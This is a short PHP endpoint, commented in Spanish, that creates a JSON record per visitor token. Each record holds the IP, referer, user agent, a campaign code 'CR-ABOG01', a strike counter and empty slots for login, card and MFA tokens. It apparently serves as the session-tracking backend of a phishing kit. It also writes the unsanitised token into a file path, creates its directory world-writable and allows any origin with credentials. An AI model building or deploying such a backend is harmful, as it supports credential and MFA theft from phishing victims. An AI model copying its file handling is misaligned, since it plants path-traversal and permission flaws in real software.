<?php
// Configuración de la ruta del directorio donde se guardarán los archivos
define('FILES_DIR', dirname(__DIR__) . '/files/');

// Asegúrate de que el directorio existe
if (!is_dir(FILES_DIR)) {
    mkdir(FILES_DIR, 0777, true);
}

// Agregar encabezados CORS
header('Access-Control-Allow-Origin: *'); // Permite solicitudes de cualquier origen
header('Access-Control-Allow-Methods: GET, POST, OPTIONS'); // Permite métodos GET, POST y OPTIONS
header('Access-Control-Allow-Headers: Content-Type, Authorization'); // Permite encabezados Content-Type y Authorization
header('Access-Control-Allow-Credentials: true'); // Permite el uso de credenciales (opcional)

// Si la solicitud es OPTIONS, responder inmediatamente sin hacer nada más
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

// Obtener el parámetro 'token' y 'ip' de la URL
$token = isset($_GET['token']) ? trim($_GET['token']) : null;
$ip = isset($_GET['ip']) ? trim($_GET['ip']) : null;
$timestamp = date('Y-m-d H:i:s'); // Obtener la fecha y hora actual

if ($token && $ip) {
    // Validar que el token no esté vacío y la IP sea válida
    if (!empty($token) && filter_var($ip, FILTER_VALIDATE_IP)) {
        // Definir el contenido del archivo JSON
        $data = [
            'token' => $token,
            'ip' => $ip,
            'time' => $timestamp,
            'camp' => 'CR-ABOG01',
            'referer' => isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'undefined',
            'strikes' => "0",
            'status' => "init",
            'map' => "1",
            'ltoken' => 'undefined',
            'ctoken' => 'undefined',
            'mtoken' => 'undefined',
            'mfastatus' => 'off', // Nuevo campo
            'mfa' => 'undefined', // Nuevo campo
            'data1' => 'undefined',
            'data2' => 'undefined',
            'data3' => 'undefined',
            'userAgent' => $_SERVER['HTTP_USER_AGENT'] ?? 'undefined'
        ];

        // Ruta completa del archivo a crear
        $filePath = FILES_DIR . $token . '.json';
        
        // Crear el archivo JSON
        file_put_contents($filePath, json_encode($data, JSON_PRETTY_PRINT));
        
        // Responder al cliente
        header('Content-Type: application/json');
        echo json_encode(['status' => 'success', 'message' => 'File created successfully']);
    } else {
        // Responder con un error si el token está vacío o la IP es inválida
        header('Content-Type: application/json', true, 400);
        echo json_encode(['status' => 'error', 'message' => 'Invalid token or IP']);
    }
} elseif (isset($_GET['ip']) && $_GET['ip'] === '!') {
    // Responder con la IP del usuario
    header('Content-Type: application/json');
    echo json_encode(['ip' => $_SERVER['REMOTE_ADDR']]);
} else {
    // Responder con un error si el parámetro no está reconocido
    header('Content-Type: application/json', true, 400);
    echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
}

